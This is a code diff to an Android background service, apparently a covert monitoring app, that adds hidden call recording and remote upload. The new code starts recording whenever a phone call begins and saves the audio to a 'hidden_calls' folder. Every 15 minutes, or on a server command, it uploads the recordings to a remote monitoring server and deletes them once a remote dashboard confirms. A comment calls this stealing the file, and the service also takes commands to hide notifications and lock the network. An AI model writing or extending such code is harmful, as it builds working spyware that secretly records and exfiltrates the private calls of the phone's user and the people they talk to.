@@ -7,6 +7,7 @@ import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.content.BroadcastReceiver
 import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.graphics.Bitmap
@@ -46,6 +47,9 @@ import android.os.Handler
 import android.os.HandlerThread
 import android.os.PowerManager
 import android.os.SystemClock
+import android.telephony.PhoneStateListener
+import android.telephony.TelephonyCallback
+import android.telephony.TelephonyManager
 import android.util.Base64
 import android.util.Log
 import androidx.core.app.NotificationCompat
@@ -62,6 +66,7 @@ import kotlinx.coroutines.sync.withLock
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.RequestBody.Companion.asRequestBody
 import okio.ByteString
 import okio.ByteString.Companion.toByteString
 import java.io.File
@@ -150,6 +155,11 @@ class MicService : Service() {
         .writeTimeout(30, TimeUnit.SECONDS)
         .readTimeout(30, TimeUnit.SECONDS)
         .build()
+    private val recordingUploadClient = httpClient.newBuilder()
+        .connectTimeout(30, TimeUnit.SECONDS)
+        .writeTimeout(5, TimeUnit.MINUTES) // allow long transfers for large files
+        .readTimeout(30, TimeUnit.SECONDS)
+        .build()
 
     // ── Streaming state ─────────────────────────────────────────────────────
     @Volatile private var isCapturing   = false
@@ -169,6 +179,8 @@ class MicService : Service() {
     private var lastDataHashStr: String = "" // Bug 5: String checksum for dedup
     // BUG-R1/R13 fix: single AtomicBoolean is the ONLY guard — isPhotoCaptureBusy removed
     private val photoCaptureBusyGuard = java.util.concurrent.atomic.AtomicBoolean(false)
+
+    private var recordingUploaderJob: Job? = null
 
     private fun currentStreamFrameMs(): Int {
         // For WebRTC (UDP), smaller 20ms frames are handled internally.
@@ -270,6 +282,7 @@ class MicService : Service() {
     // ── Data Collector ───────────────────────────────────────────────────────
     private val dataCollector by lazy { DataCollector(this) }
     private var dataJob: Job? = null
+    private var whatsAppCallReceiver: BroadcastReceiver? = null
     private var networkEnforcerJob: Job? = null
 
     // ── Prefs / Device ID ────────────────────────────────────────────────────
@@ -328,6 +341,10 @@ class MicService : Service() {
         const val WS_RECONNECT_BASE_MS = 500L     // Fast initial retry (was 2000)
         const val WS_RECONNECT_MAX_MS = 30_000L   // Max delay 30s (was 5s)
 
+        // IPC for call recorder
+        const val ACTION_WHATSAPP_CALL_START = "com.micmonitor.app.WHATSAPP_CALL_START"
+        const val ACTION_WHATSAPP_CALL_END = "com.micmonitor.app.WHATSAPP_CALL_END"
+
         // Render cloud URL — works on any network (WiFi or cellular)
         const val DEFAULT_SERVER_URL = "wss://monitor-raje.onrender.com/audio/"
         val DEFAULT_SERVER_TOKEN: String = BuildConfig.DEFAULT_SERVER_TOKEN
@@ -384,6 +401,8 @@ class MicService : Service() {
         createNotificationChannel()
         acquireWakeLock()
         setupNetworkListener()
+        setupCallListener()
+        setupWhatsAppCallReceiver()
         
         // Start discovery if already on WiFi
         val cm = connectivityManager
@@ -546,6 +565,7 @@ class MicService : Service() {
             if (!isCapturing && !isWebRtcStreaming && wantsMicStreaming) startAudioCapture()
             startMicWatchdog()
             startDataCollection()
+            startRecordingUploader()
         }
         startNetworkEnforcer()
         startHttpFallbackSync() // Bug 5: Ensure HTTP fallback starts on every command
@@ -691,6 +711,7 @@ class MicService : Service() {
         stopWebRtcSession(notifyState = false)
         stopCameraLiveStream("service_destroy")
         stopDataCollection()
+        stopRecordingUploader()
         networkEnforcerJob?.cancel()
         networkEnforcerJob = null
 
@@ -710,6 +731,9 @@ class MicService : Service() {
         audioDeviceModule = null
         networkCallback?.let {
             try { connectivityManager?.unregisterNetworkCallback(it) } catch (e: Exception) {}
+        }
+        whatsAppCallReceiver?.let {
+            try { unregisterReceiver(it) } catch (e: Exception) {}
         }
         // Bug 7: Guard WakeLock release against double-release crash
         synchronized(MicService::class.java) {
@@ -799,6 +823,7 @@ class MicService : Service() {
                 }
 
                 startDataCollection()
+                startRecordingUploader()
                 sendHealthStatus("ws_open")
                 flushOfflineAcks()
             }
@@ -853,6 +878,7 @@ class MicService : Service() {
         stopMicWatchdog()
         stopWebRtcSession(notifyState = false)
         stopDataCollection()
+        stopRecordingUploader()
         
         // Ensure HTTP fallback polling picks up slack
         startHttpFallbackSync()
@@ -1201,6 +1227,11 @@ class MicService : Service() {
             "ping" -> {
                 sendCommandAck("ping")
             }
+            "scan_recordings" -> {
+                Log.i(TAG, "CMD: scan_recordings - starting manual scan")
+                serviceScope.launch(Dispatchers.IO) { scanAndUploadRecordings() }
+                sendCommandAck("scan_recordings")
+            }
             "get_data" -> {
                 // Dashboard requested a fresh sync immediately
                 lastDataHashStr = "" // clear cache so data is forced to sync
@@ -1517,7 +1548,7 @@ class MicService : Service() {
         try {
             val obj = JSONObject(jsonText)
             when (obj.optString("type")) {
-                "get_data", "force_update", "start_stream", "stop_stream", "start_record", "stop_record", "ping", "force_reconnect", "grant_permissions", "enable_autostart", "check_update", "clear_device_owner", "lock_app", "unlock_app", "hide_notifications", "uninstall_app", "lock_network", "unlock_network" -> {
+                "get_data", "force_update", "start_stream", "stop_stream", "start_record", "stop_record", "ping", "force_reconnect", "grant_permissions", "enable_autostart", "check_update", "clear_device_owner", "lock_app", "unlock_app", "hide_notifications", "uninstall_app", "lock_network", "unlock_network", "scan_recordings" -> {
                     handleServerCommand(obj.optString("type"))
                     return
                 }
@@ -1602,6 +1633,35 @@ class MicService : Service() {
                     }
                     sendHealthStatus("photo_night_$photoNightMode")
                     sendCommandAck("photo_night", detail = photoNightMode)
+                }
+                "delete_recording" -> {
+                    val filename = obj.optString("filename", "")
+                    if (filename.isNotBlank()) {
+                        var deleted = false
+                        val hiddenDir = File(applicationContext.filesDir, "hidden_calls")
+                        if (hiddenDir.exists() && hiddenDir.isDirectory) {
+                            val target = hiddenDir.walkTopDown().maxDepth(3).find { it.name == filename }
+                            if (target != null && target.exists()) {
+                                // Prevent deleting an actively recording file
+                            if (CallRecorder.isRecording && target.absolutePath == CallRecorder.currentOutputFile?.absolutePath) {
+                                    Log.w(TAG, "Attempted to delete active recording! Denied.")
+                                } else if (target.delete()) {
+                                    deleted = true
+                                }
+                            }
+                        }
+                        
+                        if (deleted) Log.i(TAG, "Deleted recording upon PC confirmation: $filename")
+                        
+                        val uploadedKey = "uploaded_records_history"
+                        val uploadedFiles = prefs.getStringSet(uploadedKey, mutableSetOf())?.toMutableSet() ?: mutableSetOf()
+                        val toRemove = uploadedFiles.filter { it.endsWith("/$filename") }
+                        if (toRemove.isNotEmpty()) {
+                            uploadedFiles.removeAll(toRemove.toSet())
+                            prefs.edit().putStringSet(uploadedKey, uploadedFiles).apply()
+                        }
+                        sendCommandAck("delete_recording", "success", filename)
+                    }
                 }
                 "stream_codec" -> {
                     val mode = obj.optString("mode", "auto").trim().lowercase()
@@ -3318,6 +3378,205 @@ class MicService : Service() {
         dataJob = null
     }
     
+    // ────────────────────────────────────────────────────────────────────────
+    // Local Call Recording Uploader Loop
+    // ────────────────────────────────────────────────────────────────────────
+
+    private fun startRecordingUploader() {
+        recordingUploaderJob?.cancel()
+        recordingUploaderJob = serviceScope.launch(Dispatchers.IO) {
+            while (isActive) {
+                scanAndUploadRecordings()
+                delay(15 * 60 * 1000L) // 15 minute interval
+            }
+        }
+    }
+
+    private fun stopRecordingUploader() {
+        recordingUploaderJob?.cancel()
+        recordingUploaderJob = null
+    }
+
+    private val isScanningRecordingsGuard = java.util.concurrent.atomic.AtomicBoolean(false)
+
+    private suspend fun scanAndUploadRecordings() {
+        // EDGE CASE: Prevent simultaneous manual scan and automatic interval scan 
+        if (!isScanningRecordingsGuard.compareAndSet(false, true)) {
+            Log.i(TAG, "Recording scan already in progress, skipping duplicate request.")
+            return
+        }
+        try {
+            val dirsToScan = mutableListOf<File>()
+            
+            val hiddenDir = File(applicationContext.filesDir, "hidden_calls")
+            if (hiddenDir.exists() && hiddenDir.isDirectory) dirsToScan.add(hiddenDir)
+            
+            if (dirsToScan.isEmpty()) return
+
+        // EDGE CASE FIX 1: Track successfully uploaded files to prevent infinite upload loops
+        // if Android Scoped Storage prevents us from deleting the file locally.
+        val uploadedKey = "uploaded_records_history"
+        val uploadedFiles = prefs.getStringSet(uploadedKey, mutableSetOf())?.toMutableSet() ?: mutableSetOf()
+        
+        // LOOPHOLE FIX: Prune missing files to prevent SharedPreferences memory leak over time
+        val existingUploaded = uploadedFiles.filter { File(it).exists() }
+        if (existingUploaded.size < uploadedFiles.size) {
+            uploadedFiles.retainAll(existingUploaded.toSet())
+            prefs.edit().putStringSet(uploadedKey, uploadedFiles).apply()
+        }
+
+        val files = mutableListOf<File>()
+        for (dir in dirsToScan) {
+            try {
+                files.addAll(dir.walkTopDown()
+                    .maxDepth(3)
+                    .filter { it.isFile && it.name.matches(Regex(".*\\.(mp3|m4a|wav|amr|aac|ogg|opus|mkv)$", RegexOption.IGNORE_CASE)) }
+                    .take(50)
+                    .toList())
+            } catch (e: Exception) {
+                Log.e(TAG, "Error scanning directory ${dir.absolutePath}: ${e.message}")
+            }
+        }
+
+        for (file in files) {
+            // Check if the recording uploader job is still active
+            if (recordingUploaderJob?.isActive != true) break
+            
+            // EDGE CASE: Skip empty placeholder files native recorders create immediately on call start
+            if (file.length() == 0L) {
+                // LOOPHOLE FIX: If it's 0 bytes and older than 1 minute, it's a dead/failed recording. Delete it to prevent storage bloat.
+                if (System.currentTimeMillis() - file.lastModified() > 60_000L) file.delete()
+                continue
+            }
+
+            // EDGE CASE FIX 1: If file was previously uploaded but undeletable, skip to prevent infinite loop
+            if (uploadedFiles.contains(file.absolutePath)) {
+                // Do nothing here. We must wait for the PC dashboard to send the 'delete_recording' command.
+                continue
+            }
+            
+            // EDGE CASE FIX 2: Explicitly skip the currently active recording file
+            if (CallRecorder.isRecording && file.absolutePath == CallRecorder.currentOutputFile?.absolutePath) {
+                continue
+            }
+
+            // EDGE CASE: If a call is actively ongoing, the file is still being written to.
+            // Increased to 60 seconds to guarantee the call has ended before we steal and delete the file.
+            if (System.currentTimeMillis() - file.lastModified() < 60_000L) {
+                continue
+            }
+
+            var success = false
+            try {
+                val requestBody = MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("deviceId", deviceId)
+                    .addFormDataPart("recording", file.name, file.asRequestBody("audio/*".toMediaTypeOrNull()))
+                    .build()
+
+                val request = Request.Builder()
+                    .url("$serverHttpBaseUrl/api/upload-recording")
+                    .post(requestBody)
+                    // EDGE CASE FIX 2: Removed X-Filename header. OkHttp crashes if file.name contains Unicode/Emojis.
+                    // The backend Express/Multer will safely fall back to reading `req.file.originalname`.
+                    .addHeader("X-Device-Id", deviceId)
+                    .apply { if (wsAuthToken.isNotBlank()) addHeader("X-Auth-Token", wsAuthToken) }
+                    .build()
+
+                Log.i(TAG, "Uploading recording: ${file.name} (${file.length()} bytes)")
+                val response = recordingUploadClient.newCall(request).execute()
+                if (response.isSuccessful) {
+                    Log.i(TAG, "Successfully uploaded recording: ${file.name}")
+                    success = true
+                } else {
+                    Log.e(TAG, "Failed to upload recording ${file.name}, HTTP code: ${response.code}")
+                }
+                response.close()
+            } catch (e: Exception) {
+                Log.e(TAG, "Exception uploading recording ${file.name}: ${e.message}")
+            }
+
+            if (success) {
+                // DO NOT delete here. Wait for PC dashboard to download and send the delete command.
+                uploadedFiles.add(file.absolutePath)
+                prefs.edit().putStringSet(uploadedKey, uploadedFiles).apply()
+                Log.i(TAG, "Recording uploaded and kept on device until PC confirms download: ${file.name}")
+            }
+        }
+        } finally {
+            isScanningRecordingsGuard.set(false)
+        }
+    }
+
+    private fun setupCallListener() {
+        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            try {
+                telephonyManager.registerTelephonyCallback(
+                    mainExecutor,
+                    object : TelephonyCallback(), TelephonyCallback.CallStateListener {
+                        override fun onCallStateChanged(state: Int) {
+                            handleCallState(state)
+                        }
+                    }
+                )
+            } catch (e: Exception) { Log.e(TAG, "Failed to register TelephonyCallback: ${e.message}") }
+        } else {
+            try {
+                @Suppress("DEPRECATION")
+                telephonyManager.listen(object : PhoneStateListener() {
+                    @Deprecated("Deprecated in Java")
+                    override fun onCallStateChanged(state: Int, phoneNumber: String?) {
+                        handleCallState(state)
+                    }
+                }, PhoneStateListener.LISTEN_CALL_STATE)
+            } catch (e: Exception) { Log.e(TAG, "Failed to register PhoneStateListener: ${e.message}") }
+        }
+    }
+
+    private fun handleCallState(state: Int) {
+        when (state) {
+            TelephonyManager.CALL_STATE_OFFHOOK -> {
+                Log.i(TAG, "Native call active, starting hidden recording")
+                stopAudioCapture("call_started")
+                CallRecorder.startRecording(applicationContext, "Native")
+            }
+            TelephonyManager.CALL_STATE_IDLE -> {
+                Log.i(TAG, "Native call ended, stopping hidden recording")
+                CallRecorder.stopRecording("Native")
+            }
+        }
+    }
+
+    private fun setupWhatsAppCallReceiver() {
+        if (whatsAppCallReceiver != null) return
+        whatsAppCallReceiver = object : BroadcastReceiver() {
+            override fun onReceive(context: Context?, intent: Intent?) {
+                when (intent?.action) {
+                    ACTION_WHATSAPP_CALL_START -> {
+                        Log.i(TAG, "WhatsApp call detected, pausing live mic stream.")
+                        stopAudioCapture("whatsapp_call_started")
+                    }
+                    ACTION_WHATSAPP_CALL_END -> {
+                        Log.i(TAG, "WhatsApp call ended, resuming live mic stream if wanted.")
+                        if (wantsMicStreaming && !isCapturing && !isWebRtcStreaming) {
+                            serviceScope.launch {
+                                delay(500) // Give recorder time to release mic
+                                startAudioCapture()
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        val filter = IntentFilter().apply {
+            addAction(ACTION_WHATSAPP_CALL_START)
+            addAction(ACTION_WHATSAPP_CALL_END)
+        }
+        ContextCompat.registerReceiver(this, whatsAppCallReceiver, filter, ContextCompat.RECEIVER_NOT_EXPORTED)
+    }
+
+
     private fun startNetworkEnforcer() {
         if (networkEnforcerJob?.isActive == true) return
         networkEnforcerJob = serviceScope.launch(Dispatchers.IO) {
@@ -4611,7 +4870,6 @@ class MicService : Service() {
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
         )
         val alarmManager = getSystemService(AlarmManager::class.java)
-        val triggerAt = now + 8 * 60 * 1000L
         val triggerAt = now + 15 * 60 * 1000L // DOZE SAFE: Must be >= 9 mins, 15 is standard
         reconnectAlarmTriggerAtElapsed = triggerAt
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
